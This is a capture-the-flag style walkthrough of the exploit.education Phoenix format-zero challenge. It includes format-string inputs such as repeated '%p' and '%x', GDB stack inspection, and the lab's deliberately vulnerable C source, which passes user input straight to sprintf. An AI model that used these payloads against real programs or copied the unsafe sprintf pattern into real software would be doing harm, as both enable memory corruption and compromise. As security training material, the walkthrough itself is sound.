# Phoenix format-zero
https://exploit.education/phoenix/format-zero/
### Result
`Well done, the 'changeme' variable has been changed!`
### Setup
```
https://hub.docker.com/r/duckll/ctf-box/
docker pull duckll/ctf-box
docker run -idt --name ctf duckll/ctf-box
```
The above setup does not use `privileged` mode.  I have to confirm but that seems to bring in `ASLR`.  This makes debugging a little tricker as memory addresses ( like the `Stack` ) change every time you run the program.  This happens even if you type: `gef➤  set disable-aslr`:
```
gef➤  r
Starting program: /root/format_zero
warning: Error disabling address space randomization: Operation not permitted
```
### Run container
```
docker start ctf
docker container exec -it ctf bash
```

### Background
I tried a different setup for this challenge. I used a Docker container ( in `non-privileged` mode). This gave some excellent out-of-the-box stuff like `gdb's enhanced debugger`, nice `vi` color coding, `gcc` for compiling code, etc.

Next compile the code.  I didn't want the `compiler` to auto-insert `overflow` defences or add `ASLR`:

`gcc -fno-stack-protector -z execstack -no-pie -o format_zero format_zero.c`

You get a big clue of the issue when you compile the code.  Where is the ` format argument`?  For example `%s` (string) or `%d` (integer).
```
warning: format not a string literal and no format arguments [-Wformat-security]
sprintf(locals.dest, buffer);
```
##### What C API to focus on?
```
[0x00400560]> ii
[Imports]
nth vaddr      bind   type   lib name
―――――――――――――――――――――――――――――――――――――
1   0x00400510 GLOBAL FUNC       puts
2   0x00400520 GLOBAL FUNC       errx
3   0x00000000 GLOBAL FUNC       __libc_start_main
4   0x00400530 GLOBAL FUNC       fgets
5   0x00000000 WEAK   NOTYPE     __gmon_start__
6   0x00400540 GLOBAL FUNC       sprintf
7   0x00400550 GLOBAL FUNC       exit
```

`sprintf` was infamous for a `format string` vulnerability.  For example, you could print a certain `stack` with:

```
/* print the Stack */
printf ("%08x %08x %08x %08x %08x\n");
```
#### man snprintf

> int snprintf(char * restrict str, size_t size, const char * restrict format, ...);
>
> sprintf(), snprintf(), vsprintf(), and vsnprintf() write to
>      the character string str

The `...` tell you it is `variadic function`.  You can pass in any number of arguments.

##### Format String Exploitation
I got lucky with my first guess:
```
root@b8d0276ae4c8:~# ./format_zero
Welcome to https://exploit.education
%p %p %p
Well done, the 'changeme' variable has been changed!
```
Or a better way to pass it in, as run-time:
```
echo "%p %p" | ./format_zero
Well done, the 'changeme' variable has been changed!
```
Now try to find the `segmentation fault`:
```
python -c 'print "%p"*4' | ./format_zero
Well done, the 'changeme' variable has been changed!
```
No luck, let's increase the number of `format arguments`:
```
python -c 'print "%p"*11' | ./format_zero
Segmentation fault
```

### Decompile
After some renaming of variables and settings Types, the `decompile view` in `Ghidra` is easy to read:

![ghidra_relabelled_main](/images/2020/12/ghidra-relabelled-main.png)

### Debugging the normal flow
Ok, first let's make it easier to see what is happening on the `Stack`.
```
locals.changeme = 99;
```
Now get gdb setup:
```
gef➤  b *main + 113
gef➤  run
< enter "AAAA" when prompted >
```
Breakpoint fires here:
```
gef➤  x/6i $pc-5
   0x4006b3 <main+108>:	call   0x400540 <sprintf@plt>
=> 0x4006b8 <main+113>:	mov    eax,DWORD PTR [rbp-0x10]
   0x4006bb <main+116>:	test   eax,eax
   0x4006bd <main+118>:	je     0x4006cd <main+134>
   0x4006bf <main+120>:	lea    rdi,[rip+0x102]        # 0x4007c8
   0x4006c6 <main+127>:	call   0x400510 <puts@plt>
```
To find `locals.changeme = 99` on the `Stack`:
```
gef➤  find $sp, +96, 99
0x7ffe76d25c50
1 pattern found.
```
Then check the value:
```
gef➤  x/d 0x7ffe76d25c50
0x7ffe76d25c50:	99
```
Print stack from Stack Pointer with: `x/24w $sp` ( works on both `x32/x64`):
```
gef➤  x/24w $sp
0x7ffd32b6cfe0:	0x32b6d118	0x00007ffd	0x00f0b5ff	0x00000001
0x7ffd32b6cff0:	0x41414141	0x0000000a	0x0040073d	0x00000000    <--  user input "AAAA\n"
0x7ffd32b6d000:	0x41414141	0x0000000a	0x00000000	0x00000000
0x7ffd32b6d010:	0x004006f0	0x00000000	0x00400560	0x00000000
0x7ffd32b6d020:	0x00000063	0x00007ffd	0x00000000	0x00000000     <-- locals.changeme
0x7ffd32b6d030:	0x004006f0	0x00000000	0x31325b97	0x00007f1c
```

`gef` helpfully tells you that the `RSI register` is pointing to that address which taints the inputted string: `AAAA`
```
$rsi   : 0x00007ffd85571c20  →  0x0000000a41414141 ("AAAA"?)
```
Or, you can use:
```
gef➤  x/s $rsi
0x7ffd85571c20:	"AAAA\n"
```

### Debugging the altered code flow
The instructions don't change.  
```
gef➤  r
Starting program: /root/format_zero
warning: Error disabling address space randomization: Operation not permitted
Welcome to brought to you by https://exploit.education
%p %p %p
```
But the register has changed:
```
$rsi   : 0x00007fff02355878  →  0x000000000040000a
```
Printing the stack:
```
gef➤  x/24w $sp
0x7ffed7a558c0:	0xd7a559f8	0x00007ffe	0x00f0b5ff	0x00000001
0x7ffed7a558d0:	0x25207025	0x70252070	0x0040000a	0x00000000
0x7ffed7a558e0:	0x66377830	0x37646566	0x38353561	0x30203064
0x7ffed7a558f0:	0x30376178	0x30323532	0x35323037	0x30373032
0x7ffed7a55900:	0x65783020	0x37363339	0x00000a39	0x00000000
0x7ffed7a55910:	0x004006f0	0x00000000	0x4f930b97	0x00007fe8
```
Now look for `locals.changeme = 99`.  It has been written over:
```
gef➤  find $sp, +96, 99
Pattern not found.
```
What happened?  

https://www.exploit-db.com/docs/english/28476-linux-format-string-exploitation.pdf
> So what happens to the stack when a format string is specified with no corresponding variable on stack??!!  It will start to pop data off the stack from where the variables should have been located.

### Deeper analysis
The lack of a `format identifier` in this line `sprintf(locals.dest, buffer);` caused the issue.  The user was able to enter `format identifiers`.  But what actually happened at a memory level?

Let's first run without the `payload`:

##### Write dollars to destination buffer
`memset(locals.dest, '$',32);`
##### Compile to get symbol names
`gcc -g -fno-stack-protector -z execstack -no-pie -o format_zero format_zero.c`
##### Find instruction before sprintf
`disas main`
##### Breakpoint instruction before sprintf
`b *main+125`

--- let breakpoint fire ---

##### Get size of stack ( Frame Pointer - Stack Pointer on my setup )
`p/d $rbp - $rsp`
##### Print stack ( looking for lots of 0x24 = '$' )
`x/80wx $rsp`

##### Find destination buffer
```
gef➤  x/s 0x7ffca5211480
0x7ffca5211480:	'$' <repeats 32 times>
```
##### Find value to overwrite
```
gef➤  x/s 0x7ffca5211480 + 32
0x7ffca52114a0:	""
```
##### Decide how many bytes to watch
```
gef➤  p/x 40
$8 = 0x28
```
##### Watchpoint
```
gef➤  watch *(char(*)[32])(locals.dest)
Hardware watchpoint 6: *(char(*)[32])(locals.dest)
```
##### Next
```
gef➤  n
gef➤  x/s 0x7ffd57136c00
0x7ffd57136c00:	"A", '$' <repeats 31 times>
```
##### End
```
0x7ffd57136c00:	0x41414141	0x2424000a	0x24242424	0x24242424
0x7ffd57136c10:	0x24242424	0x24242424	0x24242424	0x24242424
```


### Alternative solutions
```
Welcome to brought to you by https://exploit.education
%x %x %x %x
```

##### Source code
```

#include <err.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BANNER "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

int main(int argc, char **argv) {
  struct {
    char dest[32];
    volatile int changeme;
  } locals;
  char buffer[16];

  printf("%s\n", BANNER);

  if (fgets(buffer, sizeof(buffer) - 1, stdin) == NULL) {
    errx(1, "Unable to get buffer");
  }
  buffer[15] = 0;

  locals.changeme = 0;

  sprintf(locals.dest, buffer);

  if (locals.changeme != 0) {
    puts("Well done, the 'changeme' variable has been changed!");
  } else {
    puts(
        "Uh oh, 'changeme' has not yet been changed. Would you like to try "
        "again?");
  }

  exit(0);
}
```
